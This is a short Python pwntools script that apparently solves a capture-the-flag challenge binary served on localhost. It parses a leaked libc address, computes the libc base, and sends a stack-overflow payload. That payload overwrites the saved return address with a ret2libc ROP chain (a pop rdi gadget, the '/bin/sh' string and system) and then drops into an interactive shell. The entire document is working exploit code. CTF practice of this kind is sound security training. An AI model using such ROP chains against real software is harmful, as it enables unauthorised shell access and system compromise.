from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")

p = remote("localhost", 5004)
# p = process("./chall")

p.recvuntil(b"Here's a libc leak for you: ")
leak = int(p.recvline()[:-1].decode(), 16)
print(f"libc leak (printf function address): {hex(leak)}")
libc.address = libc.address = leak - (0x7f3843a606f0 - 0x00007f3843a00000)
print(f"libc base address: {hex(libc.address)}")

pl = b'a' * 8
pl += p64(0) # overwriting saved RBP
pl += p64(0x000000000040120c) # overwrited saved RIP with ret instr
pl += p64(libc.address + 0x000000000002a3e5) # pop rdi ; ret
BIN_SH_STRING_ADDRESS = next(libc.search("/bin/sh"))
print(f"binsh string address: {hex(BIN_SH_STRING_ADDRESS)}")
pl += p64(BIN_SH_STRING_ADDRESS)
pl += p64(libc.address + 0x50d70) # address of system function

p.sendlineafter(b"Enter input: ", pl)
p.interactive()